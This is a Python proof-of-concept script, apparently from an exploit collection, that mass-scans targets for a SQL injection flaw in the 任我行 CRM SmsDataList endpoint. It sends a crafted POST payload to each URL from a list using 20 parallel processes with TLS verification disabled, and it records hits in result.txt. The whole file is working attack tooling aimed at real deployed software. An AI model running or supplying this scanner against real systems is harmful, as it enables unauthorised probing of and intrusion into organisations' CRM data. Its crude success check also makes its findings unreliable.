import requests,argparse,time,sys,urllib
from urllib.parse import unquote
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """任我行 CRM SmsDataList SQL注入漏洞"""
    print(test)

def main():
    banner()
    parser =argparse.ArgumentParser(description="任我行 CRM SmsDataList SQL注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

def poc(target):
    payload= "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    headers = {
        "User-Agent": "Mozilla/5.0(Windows NT 6.1;WOW64) AppleWebKit/537.36(KHTML,like Gecko) Chrome/57.0.1361.63 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "170"
    }
    data = 'Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000*'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    res = requests.get(url=target)
    try:
        if res.status_code == 200:
            res1 = requests.post(url=target + payload, headers=headers, data=data, timeout=10, verify=False, proxies=proxies)
            if 'message' in res1.text:
                print(f"[+]该url:{target}存在sql注入漏洞")
                with open('result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(f"{target}存在sql注入" + "\n")
            else:
                print(f'[-]该url:{target}不存在sql注入漏洞')
        else:
            print(f"{target}请求失败,请手动检查")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()